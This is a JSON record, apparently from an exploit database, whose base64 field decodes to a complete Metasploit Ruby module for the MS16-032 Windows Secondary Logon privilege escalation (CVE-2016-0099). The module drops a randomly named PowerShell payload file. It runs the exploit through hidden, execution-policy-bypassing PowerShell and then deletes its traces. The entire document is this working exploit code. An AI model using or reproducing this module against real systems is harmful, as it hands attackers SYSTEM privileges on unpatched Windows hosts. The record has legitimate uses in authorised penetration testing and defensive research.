{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ21zZi9jb3JlL3BheWxvYWRfZ2VuZXJhdG9yJw0KcmVxdWlyZSAnbXNmL2NvcmUvZXhwbG9pdC9wb3dlcnNoZWxsJw0KcmVxdWlyZSAncmV4Jw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KDQogIFJhbmsgPSBOb3JtYWxSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlBvd2Vyc2hlbGwNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OldpbmRvd3M6OlByaXYNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OldpbmRvd3M6OlByb2Nlc3MNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OkZpbGUNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OldpbmRvd3M6OlJlZmxlY3RpdmVETExJbmplY3Rpb24NCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICA9PiAnTVMxNi0wMzIgU2Vjb25kYXJ5IExvZ29uIEhhbmRsZSBQcml2aWxlZ2UgRXNjYWxhdGlvbicsDQogICAgICAnRGVzY3JpcHRpb24nICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIHRoZSBsYWNrIG9mIHNhbml0aXphdGlvbiBvZiBzdGFuZGFyZCBoYW5kbGVzIGluIFdpbmRvd3MnIFNlY29uZGFyeQ0KICAgICAgICBMb2dvbiBTZXJ2aWNlLiAgVGhlIHZ1bG5lcmFiaWxpdHkgaXMga25vd24gdG8gYWZmZWN0IHZlcnNpb25zIG9mIFdpbmRvd3MgNy0xMCBhbmQgMms4LTJrMTINCiAgICAgICAgMzIgYW5kIDY0IGJpdC4gIFRoaXMgbW9kdWxlIHdpbGwgb25seSB3b3JrIGFnYWluc3QgdGhvc2UgdmVyc2lvbnMgb2YgV2luZG93cyB3aXRoDQogICAgICAgIFBvd2Vyc2hlbGwgMi4wIG9yIGxhdGVyIGFuZCBzeXN0ZW1zIHdpdGggdHdvIG9yIG1vcmUgQ1BVIGNvcmVzLg0KICAgICAgfSwNCiAgICAgICAnTGljZW5zZScgICAgICAgPT4gQlNEX0xJQ0VOU0UsDQogICAgICAgJ0F1dGhvcicgICAgICAgID0+DQogICAgICAgICBbDQogICAgICAgICAgICdKYW1lcyBGb3JzaGF3JywgIyB0d2l0dGVyLmNvbS90aXJhbmlkZG8NCiAgICAgICAgICAgJ2IzM2YnLCAgICAgICAgICAjIEBGdXp6eVNlYywgaHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbScNCiAgICAgICAgICAgJ2tocjB4NDBzaCcNCiAgICAgICAgIF0sDQogICAgICAgJ1JlZmVyZW5jZXMnICAgID0+DQogICAgICAgICBbDQogICAgICAgICAgIFsgJ01TJywgJ01TMTYtMDMyJ10sDQogICAgICAgICAgIFsgJ0NWRScsICcyMDE2LTAwOTknXSwNCiAgICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vdHdpdHRlci5jb20vRnV6enlTZWMvc3RhdHVzLzcyMzI1NDAwNDA0MjYxMjczNicgXSwNCiAgICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vZ29vZ2xlcHJvamVjdHplcm8uYmxvZ3Nwb3QuY28udWsvMjAxNi8wMy9leHBsb2l0aW5nLWxlYWtlZC10aHJlYWQtaGFuZGxlLmh0bWwnXQ0KICAgICAgICAgXSwNCiAgICAgICAgJ0RlZmF1bHRPcHRpb25zJyA9Pg0KICAgICAgICAgIHsNCiAgICAgICAgICAgICdXZnNEZWxheScgPT4gMzAsDQogICAgICAgICAgICAnRVhJVEZVTkMnID0+ICd0aHJlYWQnDQogICAgICAgICAgfSwNCiAgICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnTWFyIDIxIDIwMTYnLA0KICAgICAgICAnUGxhdGZvcm0nICAgICAgPT4gWyAnd2luJyBdLA0KICAgICAgICAnU2Vzc2lvblR5cGVzJyAgPT4gWyAnbWV0ZXJwcmV0ZXInIF0sDQogICAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICAjIFRlc3RlZCBvbiAoMzIgYml0cyk6DQogICAgICAgICAgICAjICogV2luZG93cyA3IFNQMQ0KICAgICAgICAgICAgWyAnV2luZG93cyB4ODYnLCB7ICdBcmNoJyA9PiBBUkNIX1g4NiB9IF0sDQogICAgICAgICAgICAjIFRlc3RlZCBvbiAoNjQgYml0cyk6DQogICAgICAgICAgICAjICogV2luZG93cyA3IFNQMQ0KICAgICAgICAgICAgIyAqIFdpbmRvd3MgOA0KICAgICAgICAgICAgIyAqIFdpbmRvd3MgMjAxMg0KICAgICAgICAgICAgWyAnV2luZG93cyB4NjQnLCB7ICdBcmNoJyA9PiBBUkNIX1g4Nl82NCB9IF0NCiAgICAgICAgICBdLA0KICAgICAgICAnRGVmYXVsdFRhcmdldCcgPT4gMA0KICAgICAgKSkNCg0KICAgIHJlZ2lzdGVyX2FkdmFuY2VkX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ1dfUEFUSCcsIFtmYWxzZSwgJ1doZXJlIHRvIHdyaXRlIHRlbXBvcmFyeSBwb3dlcnNoZWxsIGZpbGUnLCBuaWxdKSwNCiAgICAgICAgT3B0Qm9vbC5uZXcoICAnRFJZX1JVTicsIFtmYWxzZSwgJ09ubHkgc2hvdyB3aGF0IHdvdWxkIGJlIGRvbmUnLCBmYWxzZSBdKSwNCiAgICAgICAgIyBIb3cgbG9uZyB1bnRpbCB3ZSBERUxFVEUgZmlsZSwgd2UgaGF2ZSBhIHJhY2UgY29uZGl0aW9uIGhlcmUsIHNvIGFueXRoaW5nIGxlc3MgdGhhbiA2MA0KICAgICAgICAjIHNlY29uZHMgbWlnaHQgYnJlYWsNCiAgICAgICAgT3B0SW50Lm5ldygnVElNRU9VVCcsIFtmYWxzZSwgJ0V4ZWN1dGlvbiB0aW1lb3V0JywgNjBdKQ0KICAgICAgXSwgc2VsZi5jbGFzcykNCiAgZW5kDQoNCiAgZGVmIGdldF9hcmNoDQogICAgYXJjaCA9IG5pbA0KDQogICAgaWYgc3lzaW5mb1siQXJjaGl0ZWN0dXJlIl0gPX4gLyh3b3d8eCk2NC9pDQogICAgICBhcmNoID0gQVJDSF9YODZfNjQNCiAgICBlbHNpZiBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAveDg2L2kNCiAgICAgIGFyY2ggPSBBUkNIX1g4Ng0KICAgIGVuZA0KDQogICAgYXJjaA0KICBlbmQNCg0KICBkZWYgY2hlY2sNCiAgICBvcyA9IHN5c2luZm9bIk9TIl0NCg0KICAgIGlmIG9zICF+IC93aW4vaQ0KICAgICAgIyBOb24tV2luZG93cyBzeXN0ZW1zIGFyZSBkZWZpbml0ZWx5IG5vdCBhZmZlY3RlZC4NCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCg0KICAgIEV4cGxvaXQ6OkNoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBpZiBpc19zeXN0ZW0/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm9uZSwgJ1Nlc3Npb24gaXMgYWxyZWFkeSBlbGV2YXRlZCcpDQogICAgZW5kDQoNCiAgICBhcmNoMSA9IGdldF9hcmNoDQogICAgaWYgY2hlY2sgPT0gRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogICAgICBwcmludF9lcnJvcigiVGFyZ2V0IGlzIG5vdCBXaW5kb3dzIikNCiAgICAgIHJldHVybg0KICAgIGVsc2lmIGFyY2gxID09IG5pbA0KICAgICAgcHJpbnRfZXJyb3IoIkFyY2hpdGVjdHVyZSBjb3VsZCBub3QgYmUgZGV0ZXJtaW5lZC4iKQ0KICAgICAgcmV0dXJuDQogICAgZW5kDQoNCiAgICAjIEV4cGxvaXQgUG9DIGZyb20gJ2IzM2YnDQogICAgcHNfcGF0aCA9IDo6RmlsZS5qb2luKE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTYtMDA5OScsICdjdmVfMjAxNl8wMDk5LnBzMScpDQogICAgdnByaW50X3N0YXR1cygiUFMxIGxvYWRlZCBmcm9tICN7cHNfcGF0aH0iKQ0KICAgIG1zMTZfMDMyID0gRmlsZS5yZWFkKHBzX3BhdGgpDQoNCiAgICBjbWRzdHIgPSBleHBhbmRfcGF0aCgnJXdpbmRpciUnKSA8PCAnXFxTeXN0ZW0zMlxcd2luZG93c3Bvd2Vyc2hlbGxcXHYxLjBcXHBvd2Vyc2hlbGwuZXhlJw0KDQogICAgaWYgZGF0YXN0b3JlWydUQVJHRVQnXSA9PSAwICYmIGFyY2gxID09IEFSQ0hfWDg2XzY0DQogICAgICBjbWRzdHIuZ3N1YiEoIlN5c3RlbTMyIiwiU1lTV09XNjQiKQ0KICAgICAgcHJpbnRfd2FybmluZygiRXhlY3V0aW5nIDMyLWJpdCBwYXlsb2FkIG9uIDY0LWJpdCBBUkNILCB1c2luZyBTWVNXT1c2NCBwb3dlcnNoZWxsIikNCiAgICAgIHZwcmludF93YXJuaW5nKCIje2NtZHN0cn0iKQ0KICAgIGVuZA0KDQogICAgIyBwYXlsb2FkIGZvcm1hdHRlZCB0byBmaXQgZHJvcHBlZCB0ZXh0IGZpbGUNCiAgICBwYXlsID0gY21kX3BzaF9wYXlsb2FkKHBheWxvYWQuZW5jb2RlZCxwYXlsb2FkLmFyY2gsew0KICAgICAgZW5jb2RlX2ZpbmFsX3BheWxvYWQ6IGZhbHNlLA0KICAgICAgcmVtb3ZlX2NvbXNwZWM6IHRydWUsDQogICAgICBtZXRob2Q6ICdvbGQnDQogICAgfSkNCg0KICAgIHBheWwuc3ViISgvLio/KD89TmV3LU9iamVjdCBJTykvaW0sICIiKQ0KICAgIHBheWwgPSBwYXlsLnNwbGl0KCInOyRzLiIpWzBdDQogICAgcGF5bC5nc3ViISgiJyciLCInIikNCiAgICBwYXlsID0gIiRzPSN7cGF5bH13aGlsZSgkdHJ1ZSl7U3RhcnQtU2xlZXAgMTAwMH07Ig0KDQogICAgQHVwZmlsZT1SZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKChyYW5kKDgpKzYpKSsiLnR4dCINCiAgICBwYXRoID0gZGF0YXN0b3JlWydXX1BBVEgnXSB8fCBwd2QNCiAgICBAdXBmaWxlID0gIiN7cGF0aH1cXCN7QHVwZmlsZX0iDQogICAgZmQgPSBzZXNzaW9uLmZzLmZpbGUubmV3KEB1cGZpbGUsIndiIikNCiAgICBwcmludF9zdGF0dXMoIldyaXRpbmcgcGF5bG9hZCBmaWxlLCAje0B1cGZpbGV9Li4uIikNCiAgICBmZC53cml0ZShwYXlsKQ0KICAgIGZkLmNsb3NlDQogICAgcHNoX2NtZCA9ICJJRVggYCQoZ2MgI3tAdXBmaWxlfSkiDQoNCiAgICAjbHBBcHBOYW1lDQogICAgbXMxNl8wMzIuZ3N1YiEoIiRjbWQiLCJcIiN7Y21kc3RyfVwiIikNCiAgICAjbHBjb21tYW5kTGluZSAtIGNhcHBlZCBhdCAxMDI0Yg0KICAgIG1zMTZfMDMyLmdzdWIhKCIkYXJnczEiLCJcIiAtZXhlYyBCeXBhc3MgLW5vbkkgLXdpbmRvdyBIaWRkZW4gI3twc2hfY21kfVwiIikNCg0KICAgIHByaW50X3N0YXR1cygnQ29tcHJlc3Npbmcgc2NyaXB0IGNvbnRlbnRzLi4uJykNCiAgICBtczE2XzAzMl9jID0gY29tcHJlc3Nfc2NyaXB0KG1zMTZfMDMyKQ0KDQogICAgaWYgbXMxNl8wMzJfYy5zaXplID4gODEwMA0KICAgICAgcHJpbnRfZXJyb3IoIkNvbXByZXNzZWQgc2l6ZTogI3ttczE2XzAzMl9jLnNpemV9IikNCiAgICAgIGVycm9yX21zZyA9ICJDb21wcmVzc2VkIHNpemUgbWF5IGNhdXNlIGNvbW1hbmQgdG8gZXhjZWVkICINCiAgICAgIGVycm9yX21zZyArPSAiY21kLmV4ZSdzIDhrQiBjaGFyYWN0ZXIgbGltaXQuIg0KICAgICAgcHJpbnRfZXJyb3IoZXJyb3JfbXNnKQ0KICAgIGVsc2UNCiAgICAgIHByaW50X2dvb2QoIkNvbXByZXNzZWQgc2l6ZTogI3ttczE2XzAzMl9jLnNpemV9IikNCiAgICBlbmQNCg0KICAgIGlmIGRhdGFzdG9yZVsnRFJZX1JVTiddDQogICAgICBwcmludF9nb29kKCJjbWQuZXhlIC9DIHBvd2Vyc2hlbGwgLWV4ZWMgQnlwYXNzIC1ub25JIC13aW5kb3cgSGlkZGVuICN7bXMxNl8wMzJfY30iKQ0KICAgICAgcmV0dXJuDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoIkV4ZWN1dGluZyBleHBsb2l0IHNjcmlwdC4uLiIpDQogICAgY21kID0gImNtZC5leGUgL0MgcG93ZXJzaGVsbCAtZXhlYyBCeXBhc3MgLW5vbkkgLXdpbmRvdyBIaWRkZW4gI3ttczE2XzAzMl9jfSINCiAgICBhcmdzID0gbmlsDQoNCiAgICBiZWdpbg0KICAgICAgcHJvY2VzcyA9IHNlc3Npb24uc3lzLnByb2Nlc3MuZXhlY3V0ZShjbWQsIGFyZ3MsIHsNCiAgICAgICAgJ0hpZGRlbicgPT4gdHJ1ZSwNCiAgICAgICAgJ0NoYW5uZWxpemVkJyA9PiBmYWxzZQ0KICAgICAgfSkNCiAgICByZXNjdWUNCiAgICAgIHByaW50X2Vycm9yKCJBbiBlcnJvciBvY2N1cnJlZCBleGVjdXRpbmcgdGhlIHNjcmlwdC4iKQ0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgY2xlYW51cA0KICAgIHNsZWVwX3QgPSBkYXRhc3RvcmVbJ1RJTUVPVVQnXQ0KICAgIHZwcmludF93YXJuaW5nKCJTbGVlcGluZyAje3NsZWVwX3R9IHNlY29uZHMgYmVmb3JlIGRlbGV0aW5nICN7QHVwZmlsZX0uLi4iKQ0KICAgIHNsZWVwIHNsZWVwX3QNCg0KICAgIGJlZ2luDQogICAgICBybV9mKEB1cGZpbGUpDQogICAgICBwcmludF9nb29kKCJDbGVhbmVkIHVwICN7QHVwZmlsZX0iKQ0KICAgIHJlc2N1ZQ0KICAgICAgcHJpbnRfZXJyb3IoIlRoZXJlIHdhcyBhbiBpc3N1ZSB3aXRoIGNsZWFudXAgb2YgdGhlIHBvd2Vyc2hlbGwgcGF5bG9hZCBzY3JpcHQuIikNCiAgICBlbmQNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/windows/local/40107.rb", 
    "id": "40107", 
    "cves": [
        "CVE-2016-0099"
    ]
}